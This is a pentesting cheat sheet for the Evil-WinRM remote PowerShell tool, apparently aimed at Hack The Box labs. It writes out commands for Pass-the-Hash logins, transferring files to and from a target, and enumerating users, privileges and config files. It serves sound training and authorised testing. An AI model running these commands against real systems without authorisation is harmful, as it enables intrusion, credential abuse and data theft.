# Evil-WinRM Cheat Sheet

Ruby-based WinRM shell for pentesting. Provides a PowerShell session on Windows targets via WinRM (port 5985/5986). Pre-installed on Kali.

---

## Basic Usage

```bash
# Connect with username and password
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD

# Connect with hash (Pass the Hash)
evil-winrm -i TARGET_IP -u USERNAME -H NTHASH

# Connect over HTTPS (port 5986)
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD -S
```

---

## Common Flags

| Flag | Description |
|---|---|
| `-i` | Target IP or hostname |
| `-u` | Username |
| `-p` | Password |
| `-H` | NT hash for Pass the Hash |
| `-S` | Use SSL (port 5986) |
| `-P` | Port (default 5985) |
| `-k` | Private key for certificate auth |
| `-c` | Public certificate |
| `-l` | Log output to file |

---

## Once Connected — Basic Navigation

```powershell
# Where am I
pwd
whoami
whoami /priv

# List directory
ls
dir

# Change directory
cd C:\Users
cd ..\Desktop

# Read a file
type flag.txt
cat flag.txt
Get-Content flag.txt

# Find files
Get-ChildItem -Recurse -Filter "flag.txt"
dir -recurse flag.txt
```

---

## File Transfer

```powershell
# Upload file from Kali to target
upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file from target to Kali
download C:\Users\admin\file.txt /local/path/file.txt
```

---

## Useful PowerShell Commands

```powershell
# List users
net user
Get-LocalUser

# List groups
net localgroup
Get-LocalGroup

# Current privileges
whoami /priv
whoami /all

# Network info
ipconfig
ipconfig /all

# Running processes
ps
Get-Process

# Services
Get-Service

# Find interesting files
Get-ChildItem -Recurse C:\Users\ -Include *.txt,*.xml,*.config 2>$null
```

---

## Common Flag Locations on HTB

```powershell
C:\Users\USERNAME\Desktop\flag.txt
C:\Users\Administrator\Desktop\root.txt
C:\Users\USERNAME\Desktop\user.txt
```

---

## Requirements

For Evil-WinRM to work:
- WinRM must be enabled on the target (port 5985 open)
- Valid credentials OR NT hash
- User must have remote management permissions

**WinRM is enabled by default on:**
- Windows Server 2012+
- Sometimes enabled manually on workstations

---

## Pentest Notes

- Evil-WinRM gives a full PowerShell session — more powerful than a basic shell
- Pass the Hash (`-H`) works when you have the NTHash but not the plaintext password
- Port 5985 = HTTP, port 5986 = HTTPS
- If connection refused — WinRM not enabled or user doesn't have remote management rights
- Tab completion works in Evil-WinRM sessions
- Upload/download commands are built in — no need for separate file transfer tools
